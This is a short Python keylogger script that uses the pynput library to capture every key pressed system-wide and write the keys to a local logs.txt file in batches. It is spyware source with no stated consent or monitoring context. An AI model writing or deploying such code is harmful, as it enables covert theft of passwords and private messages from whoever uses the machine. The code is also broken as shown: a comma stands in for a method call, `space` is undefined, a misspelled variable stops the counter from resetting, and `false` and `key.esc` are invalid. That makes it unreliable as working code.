import pynput
from pynput.keyboard import Key,Listener
word_count = 0
keys = []
def on_press(key):
    global word_count,keys
    keys.append(key)
    word_count+=1
    print(f'{key} pressed')
    if word_count>=5:
        word_counts = 0
        write_file(keys)
        keys = []
def write_file(key_arr):
    with open("logs.txt","a") as f:
        for key in key_arr:
            ke = str(key),replace("'","")
            if ke.find(space)>0:
                f.write('\n')
            if ke.find("key") == -1:
                f.write(ke)
def on_release(key):
    if key == key.esc:
        return false
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
